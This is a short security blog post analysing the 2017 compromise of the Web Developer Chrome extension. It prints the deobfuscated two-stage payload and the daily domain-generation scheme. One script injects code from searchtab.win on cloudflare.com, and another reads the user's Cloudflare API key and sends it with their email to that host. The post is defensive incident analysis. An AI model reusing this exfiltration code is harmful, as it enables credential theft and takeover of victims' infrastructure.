---
title: "Chrome Extension Steals Cloudflare Api Tokens"
date: 2017-08-03T20:59:56-04:00

---


Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I
quickly began to wonder about the what and how. Several stories exist about how the extension came
to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I
believe to be, the more nefarious behavior of the extension. Since the extension calls out to an
attacker-controlled URL, the payload hosted at that URL could be changed to _anything_ at any time.

At the time of inspection, the code checks to see if the victim is on the Cloudflare domain. If it
is, it starts an XHR request to fetch the users' API token and ships it, along with the victim's
email address, to an attacker-controlled server.

## The Code
The extension contains code that, upon visiting any site, generates a dynamic URL that changes
daily. It uses an MD5 hash of the current date, using the d-m-yyyy format.

~~~text
// tomorrow's url
https://wd + md5(4-8-2017) + .win/ga.js
https://wdfefe6195a8b014a1cc7d9cf2449d1b50.win/ga.js
~~~

The following payload is fetched on every page that a victim navigates to. The payload is encoded and
minified. Expanding it reveals the following portion:

~~~javascript.prettyprint
if (top['location']['href']['indexOf']('cloudflare.com') > -1) {
  (function () {
    var _0xb2b9x1 = document['createElement']('script');
    _0xb2b9x1['type'] = 'text/javascript';
    _0xb2b9x1['src'] = '//searchtab.win/ga.js';
    var _0xb2b9x2 = document['getElementsByTagName']('script')[0];
    _0xb2b9x2['parentNode']['insertBefore'](_0xb2b9x1, _0xb2b9x2)
  })()
} else {...
~~~

The first-stage payload checks whether the victim is currently on cloudflare.com. If they are, it
creates a new script tag on the page and sets its source to `//searchtab.win/ga.js`. This downloads
stage 2 of the payload. If we look, we get the following script:

~~~javascript.prettyprint
var xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET', 'https://www.cloudflare.com/api/v4/user/api_key', true);
xmlhttp.setRequestHeader("x-atok", window.bootstrap.atok);
xmlhttp.onreadystatechange = function() {
  if (xmlhttp.readyState == 4) {
    if(xmlhttp.status == 200) {
      var obj = JSON.parse(xmlhttp.responseText);
      var key = obj.result.api_key;
      console.log(key);
      (new Image).src = '//searchtab.win/ga.php?user=' +
        encodeURIComponent(window.bootstrap.data.user.email) + '&key=' + encodeURIComponent(key);
    }
  }
};
xmlhttp.send(null);
~~~

This second-stage payload `GET`s the logged in user's API key then sends it, and the user's email,
along to the `searchtab.win` domain.

This was clearly a targeted attack against professional Web Developers. Web Developers will
sometimes have access to production accounts on their employer's infrastructure. Though more common
in smaller companies that don't have dedicated DevOps and/or Security teams, it's not impossible
for bigger companies to fall prey.

With a valid API token, attackers could control a company's public-facing infrastructure and
create or modify sub/domains.

We've currently blocked all outgoing requests to `*.win/ga.js` and asked our developers to update
to version 0.5 of the Web Developer extension.

